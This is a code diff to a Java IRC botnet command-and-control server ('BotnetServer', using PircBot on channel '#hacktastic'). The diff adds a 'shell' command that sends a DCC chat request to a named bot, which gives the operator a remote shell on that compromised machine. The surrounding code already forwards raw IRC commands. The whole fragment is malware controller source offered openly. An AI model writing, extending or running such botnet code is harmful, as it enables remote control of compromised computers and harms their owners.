@@ -10,6 +10,7 @@ public class BotnetServer extends PircBot {
 	private static final String CHANNEL = "#hacktastic";
 	private static final String NAME = "RandR";
 	private static final int PORT = 6667;
+	private static final int TIMEOUT = 10000;
 	private Scanner input;
 	
 	public static void main(String[] args) {
@@ -65,6 +66,13 @@ public class BotnetServer extends PircBot {
 				}
 			}
 			op(CHANNEL, NAME);
+		} else if (s.toLowerCase().startsWith("shell")) {
+			String[] parts = s.split(" ");
+			if (parts.length >= 2) {
+				dccSendChatRequest(parts[1], TIMEOUT);
+			} else {
+				System.out.println("Shell: requires the nick of the bot to sheel into");
+			}
 		} else if (s.startsWith(":")) {
 			sendRawLine(s.substring(1));
 		} else {
